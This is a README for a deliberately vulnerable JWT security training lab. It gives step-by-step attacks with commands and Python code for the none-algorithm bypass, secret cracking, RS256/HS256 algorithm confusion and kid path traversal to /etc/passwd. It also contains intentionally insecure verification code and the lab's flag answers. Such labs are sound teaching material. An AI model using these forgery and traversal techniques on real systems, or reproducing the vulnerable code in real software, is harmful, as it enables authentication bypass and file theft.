# 🔐 OSWA JWT Attacks Lab - JSON Web Token Security Vulnerabilities

## **Overview**

This lab simulates a microservices authentication system with intentional JWT (JSON Web Token) vulnerabilities for educational purposes. It replicates real-world JWT security flaws similar to those covered in the OffSec Web Attacks (OSWA) certification and other security courses.

## **🏗️ Architecture**

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   React Frontend│    │  Node.js Backend│    │   MongoDB       │
│   Port 3001     │◄──►│   Port 5001     │◄──►│   Port 27018    │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                       │                       │
         └───────────────────────┼───────────────────────┘
                                 │
                    ┌─────────────────┐
                    │ JWT Debugger    │
                    │   Port 8080     │
                    └─────────────────┘
```

## **🎯 Learning Objectives**

### **JWT Attack Vectors Covered:**
1. **None Algorithm Bypass** - Remove signature verification
2. **Weak Secret Cracking** - Brute force JWT signing keys
3. **Algorithm Confusion** - RS256 to HS256 confusion attacks
4. **Kid Parameter Injection** - Path traversal via key ID parameter
5. **Privilege Escalation** - JWT claim manipulation

## **🚀 Quick Start**

### **Prerequisites:**
- Docker & Docker Compose
- At least 2GB RAM available
- Ports 3001, 5001, 8080, 27018, 81 available

### **Launch Lab:**
```bash
# Start the lab environment
docker-compose up -d

# Check container status
docker-compose ps

# View logs (optional)
docker-compose logs -f backend
```

### **Access Points:**
- **Main Application:** http://localhost:3001
- **API Backend:** http://localhost:5001
- **JWT Debugger:** http://localhost:8080
- **Combined Interface:** http://localhost:81
- **Health Check:** http://localhost:5001/health

## **🔑 Test Accounts**

| Username | Password | Role | Permissions | Description |
|----------|----------|------|-------------|-------------|
| admin | admin123 | admin | All permissions | System administrator with admin flag |
| alice | alice123 | user | read, write | Regular user account |
| service_account | service123 | service | api_access, service_to_service | Microservice account |
| guest | guest123 | guest | read | Limited guest access |
| disabled_user | disabled123 | user | read | Disabled account for testing |

## **🎯 Hidden Flags & Challenges**

### **Flag 1: None Algorithm Bypass (Easy) - 100 Points**
- **Vulnerability:** JWT accepts 'none' algorithm without signature validation
- **Flag:** `FLAG{JWT_N0N3_4LG0R1THM_BYP4SS}`
- **Location:** Login with manipulated JWT header

**Attack Steps:**
1. Login normally to get a JWT token
2. Decode the JWT header and change `alg` to `"none"`
3. Remove the signature part (everything after the last dot)
4. Use the modified token to access protected endpoints

**Example Payload:**
```bash
# Original token structure: header.payload.signature
# Modified for none attack: header.payload.

# Header change:
{"alg":"none","typ":"JWT"}
```

### **Flag 2: Weak Secret Cracking (Medium) - 250 Points**
- **Vulnerability:** JWT signed with easily guessable secrets
- **Flag:** `FLAG{JWT_W34K_S3CR3T_CR4CK3D}`
- **Location:** Crack challenge endpoint

**Attack Steps:**
1. Get challenge token from `/api/jwt/crack-challenge`
2. Use JWT cracking tools (hashcat, john, jwt_tool)
3. Try common passwords: `['123', 'password', 'secret', 'admin', 'test', 'weak_secret_123']`

**Example Commands:**
```bash
# Using jwt_tool
python3 jwt_tool.py [TOKEN] -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
hashcat -a 0 -m 16500 token.txt wordlist.txt
```

### **Flag 3: Algorithm Confusion (Hard) - 500 Points**
- **Vulnerability:** RS256 public key used as HS256 secret
- **Flag:** `FLAG{JWT_4LG0R1THM_C0NFUS10N_H4CK}`
- **Location:** Admin endpoint with forged token

**Attack Steps:**
1. Get RSA public key from `/api/jwt/pubkey`
2. Create JWT signed with HMAC using the RSA public key as secret
3. Change algorithm from RS256 to HS256 in header
4. Access admin endpoints with forged token

**Example Process:**
```python
import jwt
import requests

# Get public key
pub_key = requests.get('http://localhost:5001/api/jwt/pubkey').json()['public_key']

# Forge token
payload = {
    "sub": "admin_user_id",
    "username": "admin",
    "role": "admin", 
    "permissions": ["admin", "read", "write", "delete"]
}

# Sign with public key as HMAC secret
token = jwt.encode(payload, pub_key, algorithm="HS256")
```

### **Flag 4: Kid Parameter Injection (Hard) - 400 Points**
- **Vulnerability:** Path traversal in JWT kid parameter
- **Flag:** `FLAG{JWT_1NJ3CT10N_V1A_K1D_CL41M}`
- **Location:** File system access via kid parameter

**Attack Steps:**
1. Create JWT with malicious `kid` parameter in header
2. Use path traversal to read arbitrary files
3. Target files containing flags or sensitive data

**Example Payload:**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../etc/passwd"
}
```

## **🔍 Vulnerability Deep Dive**

### **1. None Algorithm Vulnerability**
```javascript
// VULNERABLE CODE
switch (header.alg) {
  case 'none':
    // Accepts unsigned tokens!
    const [, payloadB64] = token.split('.');
    const payload = JSON.parse(Buffer.from(payloadB64, 'base64url').toString());
    return payload;
}
```

### **2. Algorithm Confusion Attack**
```javascript
// VULNERABLE CODE  
case 'RS256':
  if (options.forceHMAC || !RSA_PUBLIC_KEY) {
    // Critical vulnerability - using RSA public key as HMAC secret!
    return jwt.verify(token, RSA_PUBLIC_KEY, { algorithms: ['HS256'] });
  }
```

### **3. Kid Parameter Injection**
```javascript
// VULNERABLE CODE
if (header.kid) {
  // Path traversal vulnerability
  const keyContent = fs.readFileSync(path.join('/app/keys', keyPath), 'utf8');
  return jwt.verify(token, keyContent);
}
```

## **🛠️ Exploitation Tools & Techniques**

### **JWT Analysis Tools:**
```bash
# JWT.io - Online JWT decoder
# https://jwt.io

# jwt_tool - Comprehensive JWT testing
pip3 install pyjwt
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py [TOKEN] -T

# Burp Suite JWT Editor Extension
# OWASP ZAP JWT Add-on
```

### **Secret Cracking:**
```bash
# Hashcat JWT cracking
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# John the Ripper
john --format=HMAC-SHA256 --wordlist=wordlist.txt jwt.txt

# Custom Python script
python3 jwt_cracker.py --jwt [TOKEN] --wordlist rockyou.txt
```

### **Algorithm Confusion:**
```python
# Python script for RS256 to HS256 confusion
import jwt
import requests

def algorithm_confusion_attack():
    # Get public key
    response = requests.get('http://localhost:5001/api/jwt/pubkey')
    public_key = response.json()['public_key']
    
    # Forge admin token
    payload = {
        "sub": "607f1f77bcf86cd799439011",
        "username": "admin",
        "role": "admin",
        "permissions": ["admin", "read", "write", "delete"]
    }
    
    # Sign with public key as HMAC secret
    forged_token = jwt.encode(payload, public_key, algorithm="HS256")
    return forged_token
```

## **🧪 Testing Methodology**

### **1. Reconnaissance Phase**
```bash
# Enumerate endpoints
curl http://localhost:5001/health
curl http://localhost:5001/api/jwt/pubkey

# Get valid JWT token
curl -X POST http://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'
```

### **2. Token Analysis**
```bash
# Decode JWT structure
echo "TOKEN_HERE" | cut -d. -f1 | base64 -d
echo "TOKEN_HERE" | cut -d. -f2 | base64 -d

# Analyze with jwt_tool
python3 jwt_tool.py [TOKEN] -T
```

### **3. Vulnerability Testing**
```bash
# Test none algorithm
python3 jwt_tool.py [TOKEN] -X a

# Test weak secrets  
python3 jwt_tool.py [TOKEN] -C -d wordlist.txt

# Test algorithm confusion
python3 jwt_tool.py [TOKEN] -X k -pk public_key.pem
```

### **4. Privilege Escalation**
```bash
# Test with forged admin token
curl -H "Authorization: Bearer [FORGED_TOKEN]" \
  http://localhost:5001/api/admin/users
```

## **📊 Lab Endpoints Reference**

### **Authentication Endpoints:**
- `POST /api/auth/login` - Login with algorithm selection
- `POST /api/auth/refresh` - Refresh token with algorithm switching
- `GET /api/user/profile` - Protected user profile

### **Admin Endpoints:**
- `GET /api/admin/users` - Admin user management (requires admin role)

### **JWT Utility Endpoints:**
- `POST /api/jwt/debug` - JWT token analysis and hints
- `GET /api/jwt/pubkey` - Get RSA public key
- `GET /api/jwt/crack-challenge` - Get weak secret challenge

### **Testing Endpoints:**
- `GET /health` - Service health and vulnerability status

## **🏁 Success Criteria**

### **Basic Challenges:**
- [ ] Bypass authentication using none algorithm (Flag 1)
- [ ] Crack weak JWT secret (Flag 2)
- [ ] Perform algorithm confusion attack (Flag 3)
- [ ] Execute kid parameter injection (Flag 4)

### **Advanced Challenges:**
- [ ] Chain multiple JWT vulnerabilities
- [ ] Demonstrate persistent access via JWT manipulation
- [ ] Extract sensitive data from JWT claims
- [ ] Create automated exploitation script

## **📚 Educational Resources**

### **JWT Security References:**
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [Auth0 JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)

### **Attack Tools & Techniques:**
- [JWT_Tool](https://github.com/ticarpi/jwt_tool) - Comprehensive JWT testing
- [JWT.io](https://jwt.io) - Online JWT decoder/encoder
- [Burp JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)

### **Real-World Examples:**
- CVE-2018-1000531 (Gitea JWT Bypass)
- CVE-2019-7644 (Auth0 None Algorithm)
- CVE-2020-28042 (WordPress JWT Authentication)

## **🔧 Lab Administration**

### **Reset Lab State:**
```bash
# Reset all JWT tokens and audit logs
docker-compose exec mongodb mongo jwtlab --eval "
db.audit_logs.deleteMany({});
db.jwt_blacklist.deleteMany({});
"

# Restart backend service
docker-compose restart backend
```

### **Monitor Attack Activity:**
```bash
# View audit logs
docker-compose exec mongodb mongo jwtlab --eval "
db.audit_logs.find().sort({timestamp: -1}).limit(10).pretty()
"

# Check vulnerability exploitation
docker-compose logs backend | grep "FLAG\|VULNERABILITY\|WARNING"
```

### **Generate New RSA Keys:**
```bash
# Generate fresh RSA key pair
docker-compose run --rm key-generator
```

## **⚠️ Security Warning**

**THIS LAB CONTAINS INTENTIONAL JWT VULNERABILITIES!**

- **Never deploy this to production environments**
- **Use only in isolated lab networks**  
- **All vulnerabilities are for educational purposes**
- **JWT security flaws can lead to complete system compromise**

## **📋 Lab Report Template**

```markdown
# JWT Attacks Lab Report - [Your Name]

## Vulnerability 1: None Algorithm Bypass
- **Technique Used:** 
- **Tools Used:**
- **Flag Captured:** 
- **Impact Assessment:**
- **Remediation:**

## Vulnerability 2: Weak Secret Cracking
- **Secret Cracked:**
- **Method/Tools:**
- **Flag Captured:**
- **Time to Crack:**
- **Remediation:**

## Vulnerability 3: Algorithm Confusion
- **Attack Vector:**
- **Public Key Used:**
- **Flag Captured:**
- **Admin Access Gained:**
- **Remediation:**

## Vulnerability 4: Kid Parameter Injection
- **File Path Accessed:**
- **Injection Payload:**
- **Flag Captured:**
- **Sensitive Data Exposed:**
- **Remediation:**

## Flags Captured:
- [ ] FLAG{JWT_N0N3_4LG0R1THM_BYP4SS}
- [ ] FLAG{JWT_W34K_S3CR3T_CR4CK3D}
- [ ] FLAG{JWT_4LG0R1THM_C0NFUS10N_H4CK}
- [ ] FLAG{JWT_1NJ3CT10N_V1A_K1D_CL41M}

## Additional Findings:
[Document any other JWT vulnerabilities discovered]

## Lessons Learned:
[Key takeaways about JWT security]
```

---

**Happy Hacking! 🔐**

*Remember: JWT vulnerabilities can completely compromise authentication systems. Always validate algorithms, use strong secrets, and never trust client-supplied data in security decisions.*